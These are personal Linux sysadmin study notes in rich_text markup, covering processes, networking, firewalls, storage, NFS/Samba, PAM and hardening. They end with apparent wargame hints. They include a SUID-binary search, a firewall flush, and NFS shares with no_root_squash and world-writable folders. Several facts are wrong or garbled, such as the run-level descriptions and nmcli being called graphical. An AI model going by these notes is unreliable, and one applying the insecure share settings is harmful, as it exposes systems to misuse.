      ⇒ policies of users, this apply by user
- Change user
   → </rich_text>
      <rich_text weight="heavy">su - username</rich_text>
      <rich_text>
   → </rich_text>
      <rich_text weight="heavy">sudo command</rich_text>
      <rich_text>
   → </rich_text>
      <rich_text weight="heavy">visudo</rich_text>
      <rich_text>, config of sudo
   → file: /etc/sudoers
- monitor user
   → who, users connected, terminal used and ip 
   → last, historical of connected users
   → w, prints the same that who with more details
   → finger - pinky, 
   → id, information of user
- talking with users
   → users, who is logged in the system
   → wall, broadcast users message, ctrl + d to send message
   → write, dedicate user message
      ⇒ write {username}, mesage is in real time
- Linux account auth
   → with miles of users
   → accounts
      ⇒ local
      ⇒ domain/directory
   → is a client - server, if user is auth reedirect to client
   → in windows is active directory
   → ldap is a protocol used by servers (linux, windows or mac)
   → for redhat is Identity Manager
   → WinBIND used in linux to communicate with windows
   → OpenLDAP is open product like IDM
- System utility commands
   → date, date
   → uptime, time is used the system (on) and users loggeds and load average of work of CPU
   → hostname, name of computer in network
   → uname, environment is working (Linux), with -a show all information of system
   → which, where is the command
   → cal, calendar
   → bc, this is a calculator
- process and jobs
   → applications = service, this is a program like firefox
   → script, commands are list of intructions, ex adduser, cp, pwd
   → process, this is created when run apps
   → daemon, this is process that is executed in background
   → threads, the process is possible that have multiple threads
   → job, run a service or process at a scheduled time
   → process = systemctl or service
      ⇒ this is for start application
      ⇒ systemctl is a new tool
      ⇒ systemctl is a eplace of service
      ⇒ usage: </rich_text>
      <rich_text weight="heavy">systemctl {action} servicename.service</rich_text>
      <rich_text>
      ⇒ </rich_text>
      <rich_text weight="heavy">systemctl list-units --all</rich_text>
      <rich_text>
   → ps, this see what process running
      ⇒ displays the currently running process in the system
      ⇒ with ps only show my process
      ⇒ </rich_text>
      <rich_text weight="heavy">ps -e</rich_text>
      <rich_text>, show all running processes
      ⇒ </rich_text>
      <rich_text weight="heavy">ps aux</rich_text>
      <rich_text>, show process in BSD format
      ⇒ </rich_text>
      <rich_text weight="heavy">ps -ef</rich_text>
      <rich_text>, show process in full format listing
      ⇒ </rich_text>
      <rich_text weight="heavy">ps -u username</rich_text>
      <rich_text>, show process by username
   → top, all process is running like a top 10
      ⇒ this is real time process check
      ⇒ </rich_text>
      <rich_text weight="heavy">top -u {user}</rich_text>
      <rich_text>, show process of user
      ⇒ </rich_text>
      <rich_text weight="heavy">top then press c</rich_text>
      <rich_text>, shows commands absolute path
      ⇒ </rich_text>
      <rich_text weight="heavy">top then press k</rich_text>
      <rich_text>, kill a process by PID within top session
      ⇒ </rich_text>
      <rich_text weight="heavy">top then M and P</rich_text>
      <rich_text>, to sort all linux running processes by memory usage
      ⇒ 
   → kill, kill the process with name or id
      ⇒ terminate processes manually, kill process or group of processes
      ⇒ </rich_text>
      <rich_text weight="heavy">kill {option} {process ID}</rich_text>
      <rich_text>
      ⇒ </rich_text>
      <rich_text weight="heavy">kill -l</rich_text>
      <rich_text>, show all signals option
      ⇒ </rich_text>
      <rich_text weight="heavy">kill -1</rich_text>
      <rich_text>, restart
      ⇒ </rich_text>
      <rich_text weight="heavy">kill -2</rich_text>
      <rich_text>, interrupt from the keyboard
      ⇒ </rich_text>
      <rich_text weight="heavy">kill -9</rich_text>
      <rich_text>, force kill process
      ⇒ </rich_text>
      <rich_text weight="heavy">kill -15</rich_text>
      <rich_text>, kill a process gracefully
      ⇒ killall, kill all
      ⇒ pkill, kill by name
   → crontab is for scheduled process in the system
      ⇒ crontab -e, edit the contrab
      ⇒ crontab -l, list contrab entries
      ⇒ crontab -r, remove the crontab
      ⇒ crond, crontab daemon
      ⇒ minute/hour/day of month/month/day of week
      ⇒ exists more crontabs
      ⇒ hourly
      ⇒ daily
      ⇒ weekly
      ⇒ monthly
      ⇒ /etc/cron.d__
      ⇒ /etc/anacontab
      ⇒ /etc/cront.d/hour
   → at, like a crontab, on time basic
      ⇒ like crontab but onle once
      ⇒ this enger to interactive mode and out with ctrl + d
      ⇒ at HH:MM PM = schedule a job
      ⇒ atq, list th at entries
      ⇒ atrm #, remove at entry
      ⇒ atd = at daemon/service that manges scheduling
      ⇒ at {time} -&gt; enter \n {task} -&gt; ctrl + D
- process management, running in terminar
   → background
      ⇒ ctrl z, this send command to background
      ⇒ jobs, this list jobs in background
      ⇒ bg, start jobs in background
   → foreground
      ⇒ fg
   → run process even after exit
      ⇒ nohup process &amp;, this create a file nohup.out
         • nohup process &gt; /dev/null 2&gt;&amp;1 &amp;
   → kill a process by name = pkill
   → process priority = nice (-20 to 19), lower number more priority
      ⇒ nice -n 5 process
- System monitoring
   → top, show process and information in interactive mode
   → df, report of use of disk or disks
   → du, is for check size of files
   → dmesg, show warnings in the system
   → iostat 1, show information of input and output devices statistics, with number refresh every {number} seconds
   → netstat, information ot network
      ⇒ netstat -rnv, show information of Iface of network
   → free, show physical memory and swap
   → cat /proc/cpuinfo, cpu info from file
   → cat /proc/meminfo, mem info from file
- logs monitoring
      ⇒ log directory=/var/log
         • boot
         • chronyd = NTP
         • cron
         • maillog
         • secure
         • messages
         • httpd
- system maintenance commands
   → shutdown, halt or reboot the machine
   → init 0-6, depending option is different action
   → reboot
   → halt
- change system hostname
   → hostname set-hostname {name}
   → edit:
      ⇒ /etc/hostname
      ⇒ /etc/sysconfig/network
- system information
   → cat /etc/redhat-release
   → cat /etc/lsb-release
   → uname -a
   → dmidecod, large information of cpu, processor, memory and others
   → arch - get architecture of machine
- terminal control keys (CTRL)
   → u, erase al typed on the command line 
   → c, stop/kill a command
   → z, suspend a command
   → d, exit from an interactive program
- terminal commands
   → clear, clear screen
   → exit, exit of session terminal
   → script. stores terminal activities in a log file can be named by user
      ⇒ script {name}
- variables
   → printenv or env, to get all variables
   → echo ${variable name}
   → export {variable_name}={value}
- special permissions
   → setuid, tells linux to run a program with the effective userid of the owner
   → setgid,  similar to setuid, but for group
   → sticky bit, set on files/directories that allows only the owner or root to delet those files
   → </rich_text>
      <rich_text weight="heavy">find / -perm /6000 -type -f</rich_text>
      <rich_text>, find all executables with setuid and setgid permissions, represents with a “s”
   → works in c programming executables not on bash shell
   → </rich_text>
      <rich_text weight="heavy">chmod +t {file}</rich_text>
      <rich_text>, to protect

Bash
- shell
   → its like a container
   → interface between users and kernel
   → CLI is a shell
   → echo $0, to check shell
   → /etc/shells
   → /etc/passwd, to check my shell
- Aliases
   → short name to commands
   → alias {name}="{command}"
   → to create aliases:
      ⇒ /home/user/.bashrc -&gt; user
      ⇒ /etc/bashrc  | /etc/bash.bashrc-&gt; global
- history
   → show all commands that was executed

Networking
- components
   → IP
   → subnet mask
   → switch/gateway
   → static vs DHCP
   → interface
   → interface MAC
- files and commands
   → interface configs
      ⇒ /etc/nsswitch.conf
      ⇒ /etc/hosts
      ⇒ /etc/sysconfig/network
      ⇒ /etc/sysconfig/network-scripts/ifcfg-nic
      ⇒ /etc/resolv.conf
- commands
   → ping
   → ifconfig, show interfaces
   → ifup, 
   → ifdown
   → netstat -rnv, to show stats
   → tcpdump, create traces, and opening listenings
- NIC information
   → ethtool {interface}
   → lo, is spetial interface is used with self-comunication
   → virb0, is used to NAT, virtual environments
- NIC or port bonding
   → this is defined by as the aggregation or combination of multiple NIC into a single bond interface
   → modprobe bonding, get configuration
   → modinfo bonding
   → create /etc/sysconfig/network-scripts/ifcfg-bond0
   → edit /etc/sysconfig/network-scripts/ethernet1
   → edit /etc/sysconfig/network-scripts/ethernet2
   → systemctl restart network
- new network utilities
   → network manager, is a new service that provides set of tools desinegnd to make it easier to manage the networking
   → nmcli, grapical environment to make network configuration, is possible assing 2 ip address with this command
   → nmtui, short of networl manager text user interface
   → nm-connection-editor, a full graphical management tool, of configurations
   → GNOME Settings, network screen of GNOME
- downloading files
   → wget, wget {website}/filename
   → curl, this and ping is used to check issues, curl -O {website}/file
   → ping, to check connection with other ip address, ping {website}
- protocols
   → FTP, standard to transfer files, this is a client-server
      ⇒ default port: 21
      ⇒ vsftpd
      ⇒ conf:
         • /ect/vsftpd/vsftpd.conf
         • disable anonymous login: anonymous_enable=NO
         • uncomment: ascii_{upload|download}_enable=YES
         • uncomment: ftpd_banner={message}
         • add to end of file: use_localtime=YES
         • restart service vsftpd
         • ftp {direction} - bin -hash 
   → SCP, help to transfer files securely
      ⇒ default port = 22, same as SSH
      ⇒ scp file {user}@ip:{path to copy}
   → rsync, remote synchronization
      ⇒ efficientlyto transfer and synch files in the same computer or a remote computer
      ⇒ is a lot faster that ftp or scp
      ⇒ is used with backups
      ⇒ default port is 22
      ⇒ syntax: rsync options source destination
      ⇒ local machine: rsync -zvh {file} {path}
      ⇒ sync a directory: rsync -azhv {path} {path}
      ⇒ to remote machine, rsync -avz {file} {user}@{ip}:{path}
      ⇒ from remote machine, rsync -avzh {user}@{ip}:{path} {file}
- in yum upgrade, delete packages and update preserves
- createrepo, this work only in redhat sabor
- yum history undo &lt;id&gt; // rollback package or rollback an update
- yum history, show all updates in the system
- telnet, unsecure connection between computers
- ssh secured
- DNS
   → Domain Name system
   → port: 53
   → porpuse -&gt; traslate name to ip address
   → hostname to ip, a record
   → ip to hostname, PTR record
   → hostname to hostname, CNAME record
   → files
      ⇒ /etc/named.conf
      ⇒ /var/named
   → services
      ⇒ systemctl restart named
   → installing
      ⇒ install bind and bind-utils
      ⇒ modify /etc/named.conf in debian is /etc/default/named and /etc/bind/named.conf.options
      ⇒ create two zones
      ⇒ modify dns permission and start services
- more tools
   → nslookup
      ⇒ get ip of hostname
      ⇒ nslookup {hostname}
   → dig
      ⇒ get the response more specific
- ntp
   → time synchronization
   → /etc/ntp.conf
   → ntpq
   → systemctl restart ntpd
   → port: 123
- chronyd
   → same as ntp
   → /etc/chronyd.conf
   → log: /var/log/chrony
   → systemctl start chronyd
   → chronyc
- timedatectl
   → is a new utilitie
   → replace of date command
   → show/changes date, time, timezone
   → synchronizes the time with ntp
   → timedatectl list-timezone
   → timedatectl set-timezone {time zon}
   → timedatectl set-time YYYY-MM_DD
   → timedatectl set-time ‘datetime’
   → timedatectl set-ntp true
- sendmail
   → to send and receive mails
   → files: /etc/mail/sendmail.mc, /etc/mail/sendmail.cf
   → command: mail -s “subject line” email@mydomain.com
- web server
   → serve webpages
   → httpd this is an apache server
- rsyslog
   → central logger
   → rsyslog is package
   → /etc/rsyslog.conf
   → systemctl restart rsyslog
- OS Hardening
   → this is for secure
   → very very important topic
   → user account, manage policies of passwords, se of chage
   → remove un wanted packages, get number of packages in system, delete innecesaries packages
   → stop un used services
   → check on listening ports, netstat -tunlp
   → secure SSH configuration, in file
   → Enable firewall, firewall-config, iptables
   → Enable SELinux, sestatus, stat to files and check permission, checkpolicy, chcon
   → change listening services port numbers
   → keep os updated
- OpenLDAP
   → slapd
   → systemctl start slapd
   → /etc/openldap/slapd.d
- traceroute
   → to map the journey that a packet of information undertakes from its source to its destination
   → helps to identify slow points
   → ex: traceroute {ip|host}
   → netstat -rnv, to check my gateway
- open imagefile
   → imagemagick program
   → display -- command
- SSH
   → timeout in /etc/ssh/sshd_config
      ⇒ ClientAliveInterval 600
      ⇒ ClientActiveCountMax 0
- SSH-keys
   → repetitive logins
   → automation through scripts
   → this is generated at user level
   → ssh-keygen
   → ssh-copy-id root@ip
   → login to ssh
- cockpit
   → server adminitration tool modern looking and user friendly
   → this contains a web based interface
   → is used in multiple distros
   → this can monitor systems
   → apt install cockpit
   → systemctl status cockpit
   → to access is in port :9090
- Firewall
   → a wall that prevents the spread of firecheck if packets against the firewall rules
   → exist two types
      ⇒ software = runs on OS
      ⇒ Hardware = dedicated appliance with firewall software
   → iptables, for older linux version, in ubuntu to start iptable: </rich_text>
      <rich_text weight="heavy">sudo ufw enable</rich_text>
      <rich_text>
   → firewalld, for newer versions
   → </rich_text>
      <rich_text weight="heavy">iptables -L</rich_text>
      <rich_text> check the rules
   → </rich_text>
      <rich_text weight="heavy">iptables -F</rich_text>
      <rich_text>, flush iptables
   → </rich_text>
      <rich_text weight="heavy">sudo systemctl status iptables</rich_text>
      <rich_text>
   → tables, is something that allows you to process packets in specific ways
   → chains: are attached to tables, to specific traffic at various points: exists 3:
      ⇒ INPUT: incoming trafic
      ⇒ FORWARD: going to route, from one devive to another
      ⇒ OUTPUT: outgoing traffic
         • chains allos you filter traffic adding ruels to them
         • Rule = if traffic is coming from x then go to defined target
   → targets: decides the fate of a package, such as allowing or rejecting it, exists 3:
      ⇒ ACCEPT: accepted
      ⇒ REJECT: is rejected
      ⇒ DROP: drop connection without send response
   → firewalld is similar, this define som services rules is easy turno on or tunr off:
      ⇒ NFS
      ⇒ NTPD
      ⇒ HTTP
      ⇒ has the following services:
         • Table
         • Chains
         • Rules
         • Targets
   → firewalld commands
      ⇒ </rich_text>
      <rich_text weight="heavy">firewalld-cmd --list-all</rich_text>
      <rich_text>, check rules
      ⇒ </rich_text>
      <rich_text weight="heavy">firewall-cmd --get-services</rich_text>
      <rich_text>, list of all servicees of firewall d
      ⇒ f</rich_text>
      <rich_text weight="heavy">irewall-cmd --reload</rich_text>
      <rich_text>, reload config file
      ⇒ </rich_text>
      <rich_text weight="heavy">firewall-cmd --get-zones</rich_text>
      <rich_text>, get all zones of firewall
      ⇒ </rich_text>
      <rich_text weight="heavy">firewall-cmd --get-active-zones</rich_text>
      <rich_text>
      ⇒ f</rich_text>
      <rich_text weight="heavy">irewall-cmd --zone=public --list-all</rich_text>
      <rich_text>, get rules for public zone
      ⇒ </rich_text>
      <rich_text weight="heavy">firewall-cmd --add-service=http</rich_text>
      <rich_text>, to add services access
      ⇒ </rich_text>
      <rich_text weight="heavy">firewall-cmd --add-service=http</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">--permanent</rich_text>
      <rich_text>
      ⇒ </rich_text>
      <rich_text weight="heavy">firewall-cmd --add-port={port}/{protocol}</rich_text>
      <rich_text>, to add by port and protocol
      ⇒ </rich_text>
      <rich_text weight="heavy">firewall-cmd --remove-port={port}/{protocol}</rich_text>
      <rich_text>, to remove by port and protocol
      ⇒ </rich_text>
      <rich_text weight="heavy">firewall-cmd --add-rich-rule='rule family="ipv4" source address="192.168.0.25" reject'</rich_text>
      <rich_text>, to reject incoming traffic
      ⇒ </rich_text>
      <rich_text weight="heavy">firewall-cmd --{add|remove}-icmp-block-inversion</rich_text>
      <rich_text>, block and unblock ICMP traffic, ping traffic
- Tune system
   → performance system
   → nice and renice
   → tuned:
      ⇒ this contains some profiles and settings predefined
      ⇒ </rich_text>
      <rich_text weight="heavy">tuned-adm</rich_text>
      <rich_text>
      ⇒ </rich_text>
      <rich_text weight="heavy">tuned-adm</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">active</rich_text>
      <rich_text>, to check profile
      ⇒ </rich_text>
      <rich_text weight="heavy">tuned-adm</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">list</rich_text>
      <rich_text>, to list all profiles
      ⇒ </rich_text>
      <rich_text weight="heavy">tuned-adm profile {name}</rich_text>
      <rich_text>, to change profile
      ⇒ </rich_text>
      <rich_text weight="heavy">tuned-adm recommend</rich_text>
      <rich_text>, to check recommendation
      ⇒ </rich_text>
      <rich_text weight="heavy">tuned-adm off</rich_text>
      <rich_text>, to stop
   → nice and renice
      ⇒ system fine-tuned command
      ⇒ for 1 cpu
      ⇒ exists 40 leves to priority, -20 to 19 (highest to lowest)
      ⇒ to check is used top
      ⇒ </rich_text>
      <rich_text weight="heavy">nice -n {priority} {process-name}</rich_text>
      <rich_text>, set the priority
      ⇒ </rich_text>
      <rich_text weight="heavy">renice -n {priority} {process-name}</rich_text>
      <rich_text>, change the process priority
- kickstart
   → to auto installitaion without intervention from user
   → kickstart server and create a kickstart file
   → file available on a network location
   → make installation osurce
   → make boot media available for client
   → start kickstart installation
   → network = NFS, FTP, HTTP, HTTPS
   → yum install system-config-kickstart
   → use of ansible
- DHCP
   → Dynamic Host Comfiguration Protocol
   → assings IP address to servers, laptops and others
   → dhcp-server to install
   → /etc/dhcp/dhcp.conf
   → for this is necesary change options in router (is not possible in all routers)


Management and run levels
- Run levels
   → main run levels:
      ⇒ 0 shutdown or halt the system
      ⇒ 1 single-user mode, aliased as s
      ⇒ 6 reboot system
   → other
      ⇒ 2 multiuser mode without network
      ⇒ 3 multiuser mode with network
      ⇒ 4 multiuser mode with networking and GUI
- computer boot process
   → frst sector is MBR on disc
   → in linux
      ⇒ bios, input and output basic system
      ⇒ MBR, executes GRUB
      ⇒ GRUB, executes kernel
      ⇒ Kernel, execute /sbin/init
      ⇒ Init, executes run level programs
      ⇒ Runlevel, this is executes from /etc/rc.d/rc.*.d
   → new versions:
      ⇒ changes because is used systemd
      ⇒ before is used SysV
      ⇒ in this executes systemD as PID 1
- message of the day
   → /etc/motd, this executes every login in the machine
   → customize
      ⇒ create /etc/profile.d/motd.sh
      ⇒ add desired commands in motd.sh
      ⇒ modify /etc/ssh/sshd_config to edit PrintMotd yes to no
      ⇒ restart ssh
- storage
   → local storage, inside computer
   → DAS, direct attached storage, CD/DVD, USB
   → SAN, storage area network, iSCI or fiber cable
   → NAS, network attached storage, used TCP?IP, Samba, NFS
- df
   → df -h, the most common
- fdisk
   → fidsk -l
- Adding disk and creatin partition
   → to adding more hard disks
   → </rich_text>
      <rich_text weight="heavy">fdisk {name of disk}</rich_text>
      <rich_text>, like slackware
   → </rich_text>
      <rich_text weight="heavy">mkfs.xfs {name of disk}</rich_text>
      <rich_text>, to format
   → </rich_text>
      <rich_text weight="heavy">mount {name of disk} {folder}</rich_text>
      <rich_text>
   → modify /etc/fstab -&gt; </rich_text>
      <rich_text weight="heavy">{name of disk} \t {folder} \t {format} \t defaults \t 0 \t 0</rich_text>
      <rich_text>
- LVM
   → allows disks to be combined together
   → is a logical volume management
   → to add:
      ⇒ </rich_text>
      <rich_text weight="heavy">fdisk {disk}</rich_text>
      <rich_text>, select type as </rich_text>
      <rich_text weight="heavy">8e</rich_text>
      <rich_text>, Linux LVM
      ⇒ </rich_text>
      <rich_text weight="heavy">pvcreate {name of disk}</rich_text>
      <rich_text>, to create the volume
      ⇒ </rich_text>
      <rich_text weight="heavy">pvdisplay</rich_text>
      <rich_text>, to show volumnes
      ⇒ </rich_text>
      <rich_text weight="heavy">vgcreate {name} {name of disk}</rich_text>
      <rich_text>, create volume
      ⇒ </rich_text>
      <rich_text weight="heavy">vgdisplay</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">{name}</rich_text>
      <rich_text>, to show logical volumes
      ⇒ </rich_text>
      <rich_text weight="heavy">lvcreate -n {name of volume} --size {size} {name of vg}</rich_text>
      <rich_text>
      ⇒ </rich_text>
      <rich_text weight="heavy">lvdisplay</rich_text>
      <rich_text>, to show all logical volumes
      ⇒ </rich_text>
      <rich_text weight="heavy">mkfs.xfs {logical volume} </rich_text>
      <rich_text>-&gt; /dev/{logical vg}/{logical volume}
      ⇒ mount volume in folder
   → to extends
      ⇒ create new volume of type 8e
      ⇒ pvdisplay
      ⇒ pvs
      ⇒ vgdisplay {name_vg}
      ⇒ pvcreate {new volume}
      ⇒ vgextend {group vg} {new volume}
      ⇒ lvextend -L+1024 {/dev/mapper}/{logical volume}
      ⇒ xfs_growfs
      ⇒ /dev/db_mysql/mysql_data
- Swap
   → amount fo physical memory
   → recommend: 
      ⇒ if M &lt; 2; S = M* 2; else S = M + 2
   → commands
      ⇒ dd
         • dd if=/dev/zero of=/{name file} bs=1M count-1024, this create new file
         • chmod go-r {name file}, only read/write to user owner
      ⇒ mkswap
         • mkswap {name file}
      ⇒ swapon and swapoff
      ⇒ free -m
- stratis
   → this is a volume mangement
   → combines creation of LVM and filesystem into one mangement
   → this manage by pool
   → systemctl start stratisd
   → stratis pool create {name} {disk}
   → stratis list
   → stratis pool add-data {name} {disk}, add more space from another disk
   → stratis filesystem list
- RAID
   → Redudant array of independent disks
   → types
      ⇒ 0
         • adding disk to add space, for datawarehousing to create disk more greates
      ⇒ 1
         • this is a copy of another disk, this is slow because is a replicate
      ⇒ 5
         • three or more disk
         • olerancia a fallos, alta capacidad y eficacia de almacenamiento
- file system check
   → fsck
      ⇒ used to chec ext2, ext3, ext4 and somes
   → xfs_repair
      ⇒ used to repair xfs filesystem
   → during boot the system runs fsck to check filesystem
   → is necesary use manually for system administrator
   → to check is necesary unmounted file systems to avoid any data corruption issues
   → force with -f
   → to get error is used option -y
   → the xsf_repair s highly scalable, xfs_repair does not run at boot time
   → steps
      ⇒ df -T, show the type of disk
      ⇒ fsck {disk}, this fails if type is xfs
      ⇒ xfs_repair needs umount disk to check
- dd (system backup)
   → 5 different types of backups
      ⇒ system backu (entire image)
      ⇒ application backup (third party application backup)
      ⇒ database backup (for databases)
      ⇒ filesystem backup (tar, gzip drectories)
      ⇒ disk backup or dick cloning (dd command)
         • this is a command line of unix
         • to clone:
            ◇ dd if={source} of={target} [options]
- NFS (Network file system)
   → development by sun microsystem
   → it is a clien/server system
   → linked 2 computers by network connecting for NFS shared filesystem
   → conf:
      ⇒ install nfs-utils libnfsidmap (in centos)
      ⇒ enable rpcbind
      ⇒ enable nfs-server
      ⇒ start rpcbind, nfs-server, rpc-statd, nfs-idmapd
      ⇒ mkdir {folder}
      ⇒ chmod a+rwx {folder}
      ⇒ modify /etc/exports
         • {folder} {ip client} (rw,sync,no_roor_squash) = for only 1 host, in ip client with * is for everyone
      ⇒ exportfs -rv
   → in client:
      ⇒ install nfs-utils rpcbind
      ⇒ start rpcbind
      ⇒ showmount -e {ip server}, this show filesystem to use
      ⇒ mount {ip server}:{folder} {folder to mount}
- Samba
   → tool to sharing resources such as files and prints with other OS
   → this work like NFS, but with more options of OS
   → this works with protocol called SMB (server message block)
   → another is CIFS (common internet file system)
   → CIFS is a extension of SMB
   → This is simple
   → install and conf:
      ⇒ modify /etc/samba/smb.conf
      ⇒ start samba
      ⇒ install samba samba-client and samba-common
      ⇒ make directory to share
      ⇒ chmod a+xwr {folder}
      ⇒ chown -R nobody:nobody {folder}ajajaja
      ⇒ to mount in linux: mount -t cifs //{ip server}:{Anonymoun/} {path to mount}
- Sata and SAS
   → SAS for servers
   → SATA for desktop


OFFTOPICS
- fmt
   → formatting and optimizing contents in text files:
      ⇒ fmt {-width} {option} {file}
      ⇒ fmt -u {file}, use one space between words and 2 spaces between setences
- tr
   → copies the standar input to the standar ouput with substitution or deletion of selected characters
   → traslate or delete characters
   → replace some range of letter by another in one text
   → with the -c flags this replace all chars except the selected: echo “GNULinux” | tf -c “GNU” “abc”
   → with -d this delete the chars selected: echo “GNU/Linux” | tr -d “/Linux”
   → this can delete repeated characters
   → is possible create case conversion using tr “[:lower:]” “[:upper:]”
   → prints every word on a single line: tr “:” “\n”
   → remove new lines: tr “\n” “ ” &lt; {file}
- nl
   → read lines from the named file or the standard input, applies a configurable line numbering filter operatin and write the result to the standard out
   → number lines
- atop
   → interactive monitor to view the load on a linux system.
   → shows the ccupation oof the most critical hardware respurces
- lsof
   → list on its standard ouput file information about files opened by processes
   → is possible show processes running on specific port: lsof -i TPC:22
   → or by user: lsof -u {user}
- strace
   → for diagnostic, debugging tool for unix. Traces the system call and signals a process uses during its lifetime
   → strace -p {[rpcess id}
- dtrace
   → dynamic tracing framwork ported from solaris. 
   → troubleshooting kernel
- systemtap
   → find in network
- Nmon
   → interactive performance monitoring command line utility
   → it is a benchmark tool to display performance
- iostat
   → is used for monitoring system input and output statistics for devices and partitions
- sar
   → System activity report, shows a report of different information about the usage and activity of resources in the os
- vmstat
   → virtual memory static reporter, report variuos information about the os as memory paging processes, I/O, cpu and disk usage
- mtr
   → this combines the functionality of tracerout and ping
   → this prints the internet routes with response times
- nmap
   → stands network maper, to explore and audit the network's security, checks firewalls and scanning ports

Questions
run-level -&gt; A y C
52, permissions is A
72, variables with export
selinux stats, a and c
httpd is /etc/httpd/conf/httpd.conf
default page: /var/www/html/index.html
nfs: /etc/sysconfig/nfs
92 -&gt; 1
98 -&gt; 1

count words in one file: more data.txt | sort | uniq -c | sort
tr 'A-Za-z' 'N-ZA-Mn-za-m' ## to use rot13
cat &lt; -file_name, read dashed file
openssl s_client -connect localhost:30001, to send cypher message
for b21 is necesary create a temporal server and connec with the file</rich_text>
      <node name="security" unique_id="133" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1672706317" ts_lastsave="1676836219">
        <rich_text>what is security and Hardering
- any type of protection against harm
- hardening  is used when making the OS so hard to break

tools
- manual security configuration
   → user accounts
   → file systems
   → system access
   → system security (system configuration files)
   → OS network layer security
- automate through scripts
- deployment tools (ansible, puppet)
- types of breach
   → data
      ⇒ steel
      ⇒ corrupt
      ⇒ remove
   → application
      ⇒ like apache server
      ⇒ databases
      ⇒ financial applications
   → operating system
      ⇒ filesystem corruption
      ⇒ system failure
      ⇒ Process management
   → Hardware
      ⇒ Attack on CPU, memory

Security Users
- /etc/password
   → is a user configuration file
   → /etc all configurations
   → etc = etcetera
   → all in etc are editable and customizable
   → username:pass:uid:guid:user info:home dir:shell
- /etc/group
   → that has information about user group
   → user can not created without group
   → each user belongs to a group or multiple
   → groupname:group password:group ID:group list
- /etc/shadow
   → store actual password in encrypted format with additional info
   → user:password:last Password change:minimum:maximum:warn:inactive:expire
   → in pass:
      ⇒ $1$ MD5
      ⇒ $2a$ blowfish
      ⇒ $2y$ blowfish
      ⇒ $5$ SHA-256
      ⇒ $6$ SHA-512
- /etc/login.defs
   → chage command to manage login by user
   → this file is apply for all users
   → UMASK is used to default permission by user
- commands
   → useradd and passwd
- chage
   → command per user to manage policies of password
- setting password policy
   → exists 3 files
      ⇒ /etc/login.defs
      ⇒ /etc/pam.d/system-auth
      ⇒ /etc/security/pwquality.conf, password quality
- lock or disable users
   → by security disable inactive accounts
   → /etc/default/useradd, default configuration of a user
      ⇒ is this is possible specify the number of days a password expires
      ⇒ 35 days is recommended
   → lastlog -b 90 check user status
   → lastlog -b 90 | tail -n+2 | grep -v ‘Never log’
- to disble user:
   → usermod -L username
   → passwd -l username
   → Change user shell to /bin/nologin in /etc/passwd
- to enable:
   → usermod -U username
   → passwd -u username
- failed 3 times
   → auth require pam_tally2.so deny=3 onerr=fail unlock_time=600, add in /etc/pam.d/system-auth and /etc/pam.d/password-auth
   → account required pam_tally2.so, in account section of same files
   → pam_tally2 --user=username, check number of failed logins
   → pam_tally2 -r -u username, this is for unlock
- restrict root login
   → this is very powerful account
   → is not restricted 
   → is important that you have a regular user account
   → cp /etc/ssh/sshd_config
   → replace
      ⇒ #PermitRootLogin yes to no
- disable access ssh for a specific user
   → add DenyUsers {username}
- ulimit
   → memory, cpu, disk
   → is possible as admin restrict resources utilization
   → is possible limit at global, user and by group
   → exist two types soft and hard, this is like docker
   → ulimit -a, show current config of user
   → /etc/security/limits.conf
   → is possible adjust the limits for the session with ulimit -u 2000 for process
- UID/GID policy
   → range from 0-99
   → separate user UID/GIU from application
   → user accounts start above 100+
   → this is assigned when running useradd
- centralize auth
   → use of OpenLDAP
   → Redhat IDM
   → Winbind
   → micrsoft active directory
- sudo access
   → regular user to run root commands
   → used to normal user execute progam as root user
   → file: /etc/sudoers
   → example: root ALL=(ALL) ALL
      ⇒ all is the users allowed
      ⇒ is the hosts
      ⇒ ths user as you are runnng the command
      ⇒ the commands allowed
   → specific command:
      ⇒ user ALL=(ALL) NOPASSWD: /sbin/fdisk
   → wheel group in fedora
- Monitor user activity
   → logging = log or record the activity
   → auditing = validate the activity
   → default:
      ⇒ /var/log/messages
      ⇒ /var/log/secure
      ⇒ last command
      ⇒ lastb
      ⇒ who or w
      ⇒ /home/user/.bash_history user command history
      ⇒ tcpdump = server incoming and outging
      ⇒ /etc/rsyslog.conf logging confgs
      ⇒ ps -ef | grep username monitor user running processes

PAM
- pluggable authentication module, provide dynamic auth support tat sits between apps and native auth system
- easy use when sysadmin needs integrate services or programs with different auth mechanism
- ex: su, password, ssh, logging in FTP, telnet
- conf:
   → /etc/pam.conf or /etc/pam.d (to split confs by ind services), if pam.d exists pam.conf is ignored
   → pam send to:
      ⇒ /var/log/messages
      ⇒ /var/log/secure
- conf:
   → mangement group
   → control flags
   → module (SO File) in /lib/security or /lib64/security
- groups:
   → authentication, checking a password with other
   → account: check iff account is valid, includes conditions like expiration, time of day, and user access to the request service
   → password: responsible for updating password, force policies in passwords
   → session: manage actions in session
- control flags:
   → four control flags
   → requisite, the strongest flag, if is is flagged as requisite and it fails
   → required: in case of failure execution is not stopped but continues to the next module, if on failed or more PAM return failure
   → sufficient: if returns OK the processing of modules willbe stop
   → optional: in case of failure the stack of modules continues executing and return code is ignored
   → additional exist two more
   → include: include all lines of given type
   → substrack: same as above
- modules:
   → this is loaded in /lib o /lib64 /security
   → is possible use any backend like /etc/password or database
   → each module can be pulled from man pages
   → the main module is pam_unix.so
   → fourth column is module args
- check if program is PAM-aware
   → ldd /usr/sbin/sshd | grep pam
   → ldd /bin/su | grep pam
- modules order:
   → stack are tried one by one
   → the order matters the effect in one is required for the next module
- if program does not file config is used /etc/pam.d/other

Security linux filesystem
- Linux file types
- different types:
   → - regular file
   → d directory
   → l link
   → c special file or device files in /dev
   → s scoket /dev/log
   → p named pipe, similiar to sockets allow comunication between 2 processes
   → b block device like /dev/sda
- file attributes
   → total column: 9
   → type
   → # of links
   → owner
   → group
   → size
   → month
   → day
   → time
   → name
- exists two owners, user and group
- commands: chown, change user owner, chgrp, change group owner
- is responsability of user for controlling access to their files
- ACL
   → additional layer of permissions to allow and assing permissions by user
   → user is not a member of group create, but is necesary access (RW)
   → permission to user: setfacl -m u:user:rwx {path to file}
   → permission to group: setfacl -m g:group:rw {path to file}
   → Allow in cascade: setfacl -dm “entry” {path}
   → remove a specific entry: setfacl -x u:user {path to file}
   → remove all entries: setfacl -b {path to file}
